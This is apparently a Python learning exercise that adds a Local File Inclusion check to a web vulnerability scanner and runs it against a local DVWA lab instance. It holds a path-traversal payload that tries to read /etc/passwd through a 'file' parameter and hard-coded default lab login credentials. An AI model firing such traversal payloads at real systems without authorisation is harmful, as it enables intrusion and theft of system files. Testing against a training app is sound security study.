import requests
import re
from urllib.parse import urlparse  # Update the import statement
from bs4 import BeautifulSoup  # Use 'bs4' instead of 'BeautifulSoup'

class Scanner:
    # ... (other methods and initialization)

    # New function to test for Local File Inclusion (LFI) vulnerabilities in URLs
    def test_lfi_in_link(self, url):
        lfi_test_payload = "../../../../../../../../../../etc/passwd"  # LFI test payload
        url = url + "?file=" + lfi_test_payload
        response = self.session.get(url)
        return "root:" in response.content



#THE CODES BELOW WILL GO TO THE SECOND VULNERABILITY SCANNER  SCRIPT THAT IMPORTS THE SCANNER2.PY
#!/usr/bin/env python

import scanner2

target_url = "http://192.168.63.131/dvwa/"
links_to_ignore = ["http://192.168.63.131/dvwa/logout.php"]
data_dict = {"username": "admin", "password": "password", "Login": "submit"}

vuln_scanner = scanner2.Scanner(target_url, links_to_ignore)
vuln_scanner.session.post("http://192.168.63.131/dvwa/login.php", data=data_dict)
vuln_scanner.crawl()
vuln_scanner.run_scanner()

# Add code to test for Local File Inclusion (LFI) vulnerabilities
for link in vuln_scanner.target_links:
    print("\nTesting LFI in link: " + link)
    is_vulnerable_to_lfi = vuln_scanner.test_lfi_in_link(link)
    if is_vulnerable_to_lfi:
        print("[*****] LFI Vulnerability Discovered in: " + link)
